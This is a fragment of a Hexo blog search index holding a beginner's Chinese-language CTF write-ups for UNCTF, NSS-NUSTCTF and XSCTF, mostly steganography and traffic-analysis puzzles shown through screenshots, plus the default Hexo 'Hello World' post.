把第二段放进去</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/06/5b477a7484bd96a3.png"></p><p>给了一个已经给了的提示…</p><p>然后 ctrl+A 全文复制  cyberchef 打开 Escape Unicode Characters （或者用subline打开）</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/06/26f409f1f7e651c7.png"></p><p><a href="http://330k.github.io/misc_tools/unicode_steganography.html">零宽字符隐写</a></p><p>对照 CyChef 的零字段进行选择：</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/06/6f1c5e01ca340c06.png"></p><p>解密得到flag</p><p>flag：UNCTF{We1come_new_ctfer}</p><h2 id="找得到我吗-闽南师范大学"><a href="#找得到我吗-闽南师范大学" class="headerlink" title="找得到我吗-闽南师范大学"></a>找得到我吗-闽南师范大学</h2><p>打开附件：</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/06/55e94900e9f65bce.png"></p><p>先是尝试了许多方法</p><p>ctrl+A 全文复制放到 CyChef 里也没发现有隐藏的flag或者零宽字段隐写</p><p>然后直接解压docx 解压出来的文件日期都是2012年 明显不在此</p><p>无意中按到了这个</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/06/e8f809e30461cbc2.png"></p><p>发现flag：</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/06/f4821e100238574b.png"></p><p>flag：UNCTF{You_find_me!}</p><h2 id="清和fan-江西警察学院"><a href="#清和fan-江西警察学院" class="headerlink" title="清和fan-江西警察学院"></a>清和fan-江西警察学院</h2><p>附件第一个压缩包：</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/07/086a8174d1b71f3a.png"></p><p>（还好我也看清和 嘻嘻） 解压后包内含图片和压缩包：</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/07/49eb70f7e4b33a08.png"></p><p>zsteg 玛奇玛图片 出压缩包密码</p><p>包内附件 ：</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/07/eda5427882d2ef4a.png"></p><p>想到 SSTV   第一次做这种题</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/08/ba188cabdf951c67.png"></p><p>得到最后一个压缩包密码</p><p>附件为一个txt   （txt基本都为零宽字段隐写了）</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/07/cc9e24e4f8dbe464.png"></p><p>flag：UNCTF{wha1e_wants_a_girlfriend_like_alicia}</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UNCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSS-NUSTCTF WP</title>
      <link href="/posts/d44dd316cae3/"/>
      <url>/posts/d44dd316cae3/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>记录一下刚开始学的WP~  虽然只做了一题嘿嘿</li></ul><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezProtocol"><a href="#ezProtocol" class="headerlink" title="ezProtocol"></a>ezProtocol</h2><p><img src="https://s3.bmp.ovh/imgs/2023/02/28/a0fb6b407b1fd098.png"></p><p><img src="https://s3.bmp.ovh/imgs/2023/02/28/ce471601c167c120.png"></p><p><img src="https://s3.bmp.ovh/imgs/2023/02/28/23aecc50cea62e82.png"></p><p><img src="https://s3.bmp.ovh/imgs/2023/02/28/cd682af4d81e14bd.png"></p><p>然后用 burp 抓包</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/01/ad35e32703882038.png"></p><p>发现用相同0e没有用</p><p>找到 <a href="https://blog.csdn.net/EC_Carrot/article/details/109525162?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166821858016782427436621%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=166821858016782427436621&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-11-109525162-null-null.142%5Ev63%5Econtrol,201%5Ev3%5Econtrol,213%5Ev2%5Et3_esquery_v3&utm_term=p1%20%E5%92%8C%20p2%20%E5%BF%85%E9%A1%BB%E4%B8%8D%E5%90%8C%E4%BD%86%E5%85%B7%E6%9C%89%E7%9B%B8%E5%90%8C%E7%9A%84%20md5&spm=1018.2226.3001.4187">强比较知识点</a></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/01/4396feee11b72490.png"></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/01/8831601ed5d84fe5.png"></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/01/f4c3e660e092c653.png"></p><p>flag：NSSCTF{a45f1996-1fc1-4be0-b2e1-9c3969bdd676}</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NUSTCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSCTF 联合招新赛 决赛 WP</title>
      <link href="/posts/71009b8a6a8c/"/>
      <url>/posts/71009b8a6a8c/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>这是第一次参加 CTF 的比赛 也是第一次试着写 WP ~</li></ul><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="中等-shark-u"><a href="#中等-shark-u" class="headerlink" title="[中等] shark_u"></a>[中等] shark_u</h2><p><img src="https://s3.bmp.ovh/imgs/2023/02/28/e9a5f4f0162ab6a8.png"></p><p><img src="https://s3.bmp.ovh/imgs/2023/02/28/58677b71844cfd1b.png"></p><p><a href="https://www.cnblogs.com/Cl0ud/p/11824023.html">流量题入门参考</a></p><p>看到题目说密码  筛选直接输入 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method==POST</span><br></pre></td></tr></table></figure><p>发现rar  选择显示原始数据 另存为rar文件</p><p>发现rar包有密码 怀疑是伪加密 捣鼓半天没搞出来 于是想回题目 弱密码</p><p>（刚入门  工具过于拉  爆破不了） 只能翻看数据包 筛选 text</p><p><img src="https://s3.bmp.ovh/imgs/2023/02/28/fdc55ee6cb6dfbcd.png"></p><p>发现成功登陆数据包 输入得到docx文件 进入发现看不见 ctrl+A 全选复制</p><p>复制到其他地方就可以看见</p><p><img src="https://s3.bmp.ovh/imgs/2023/02/28/632f5f3b2ca5103f.png"></p><p>flag：flag{vv0_noNono_dont_6e_x1Aoheizi_ok?}</p><h2 id="简单-easy-logo"><a href="#简单-easy-logo" class="headerlink" title="[简单] easy_logo"></a>[简单] easy_logo</h2><p><img src="https://s3.bmp.ovh/imgs/2023/02/28/c19e7b6218691762.png"></p><p><img src="https://s3.bmp.ovh/imgs/2023/02/28/a85f1c1145af2930.png"></p><p>用 stegsolve 打开分解gif为一张张图片</p><p>一开始直接每张图看是否直接藏在里面 找了半天没找着</p><p>然后想起一题是用黑白来表示二进制101 于是直接将图片黑白换为101</p><p>（不认识华师战队的队标 一开始把那张小小的也当成白色）</p><p>后面发现应该是分隔 于是换为空格</p><p>手打就手打 不会脚本捏</p><p><img src="https://s3.bmp.ovh/imgs/2023/02/28/378fa3e1461a4ba1.png"></p><p><img src="https://s3.bmp.ovh/imgs/2023/02/28/1ed61e7e0cb41f84.png"></p><blockquote><p><em><strong>（关注重点：flag二进制为1100110 1101100 1100001 1100111）</strong></em></p></blockquote><p>flag：flag{c0ngratu1ati0n5!}</p><h2 id="简单-猜数字1-0-未解出……"><a href="#简单-猜数字1-0-未解出……" class="headerlink" title="[简单] 猜数字1.0  (未解出……"></a>[简单] 猜数字1.0  (未解出……</h2><p><img src="https://s3.bmp.ovh/imgs/2023/02/28/1690fe90fefd4b5e.png"></p><p>我不理解……  网站转换和一个脚本转换都转出来24位</p><p>audacity 数出来也是24位：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1596<span class="comment">#38952#73751#4185856</span></span><br></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2023/02/28/0cf4ead323ee00ef.png"></p><p>看着题目 flag{数字} 折腾了半天#如何转换  最后都没搞出来……</p><p>最后得到同学的一个脚本</p><p><img src="https://s3.bmp.ovh/imgs/2023/02/28/44612cbe73061ff1.png"></p><p>2是哪冒出来的……</p><blockquote><p><em><strong>（以后音频题还是 windows 和 linux 两个脚本一起用吧……）</strong></em></p></blockquote><p>flag：flag{15926#38952#73751#4185856}</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/31d9550ac14a/"/>
      <url>/posts/31d9550ac14a/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
